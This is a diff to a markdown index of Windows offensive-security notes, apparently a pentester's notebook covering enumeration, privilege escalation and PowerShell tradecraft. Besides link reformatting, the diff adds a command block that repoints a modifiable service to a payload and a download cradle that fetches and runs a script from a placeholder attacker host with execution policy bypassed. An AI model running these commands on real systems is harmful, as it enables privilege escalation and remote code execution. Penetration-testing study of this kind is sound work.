@@ -1,10 +1,10 @@
 # Windows — Offensive Notes Overview
 
-Index for Windows host offense: local enumeration, privilege escalation, and the PowerShell tradecraft used throughout. Domain-wide attacks live in [[../AD/AD Attacks Overview|Active Directory]].
+Index for Windows host offense: local enumeration, privilege escalation, and the PowerShell tradecraft used throughout. Domain-wide attacks live in [Active Directory](../AD/AD%20Attacks%20Overview.md).
 
 ## Notes in this folder
 
-- [[Powershell]] — download-cradle / execution-policy bypass concept
+- [Powershell](Powershell.md) — download-cradle / execution-policy bypass concept
 
 ## Local enumeration
 
@@ -42,15 +42,25 @@ Automate the checks, but confirm each finding manually before exploiting on a cl
 
 ## PowerShell tradecraft
 
-- **Execution policy is not a security boundary** — it's trivially bypassed (`-ep bypass`, download cradles). See [[Powershell]].
+- **Execution policy is not a security boundary** — it's trivially bypassed (`-ep bypass`, download cradles). See [Powershell](Powershell.md).
 - **Download cradle concept:** pull a script from your server into memory and run it, avoiding disk. This is why defenders rely on AMSI, Constrained Language Mode, and script-block logging rather than execution policy.
 - **Living off the land (LOLBins):** `certutil`, `bitsadmin`, `mshta`, `rundll32` — legit binaries with dual use; know them for both offense and detection.
 
+```powershell
+# Weak-service abuse: repoint a service you can modify, then restart it
+sc qc <service>
+sc config <service> binPath= "C:\Windows\Temp\payload.exe"
+sc stop <service> & sc start <service>
+
+# In-memory download cradle (execution policy is not a boundary)
+powershell -ep bypass -nop -c "IEX (New-Object Net.WebClient).DownloadString('http://<attacker-ip>/s.ps1')"
+```
+
 ## Credential access on Windows
 
-Covered in depth under AD since the techniques overlap: see [[../AD/Lateral Movement & Credential Access]] for LSASS, SAM, DPAPI, and pass-the-hash.
+Covered in depth under AD since the techniques overlap: see [Lateral Movement & Credential Access](../AD/Lateral%20Movement%20%26%20Credential%20Access.md) for LSASS, SAM, DPAPI, and pass-the-hash.
 
-For the network route — dumping hashes and getting a SYSTEM shell remotely with local-admin creds/hashes (`secretsdump.py`, `psexec.py`, `wmiexec.py`) — see [[../AD/Impacket Toolkit]].
+For the network route — dumping hashes and getting a SYSTEM shell remotely with local-admin creds/hashes (`secretsdump.py`, `psexec.py`, `wmiexec.py`) — see [Impacket Toolkit](../AD/Impacket%20Toolkit.md).
 
 ## Defense / detection (for the report)
 
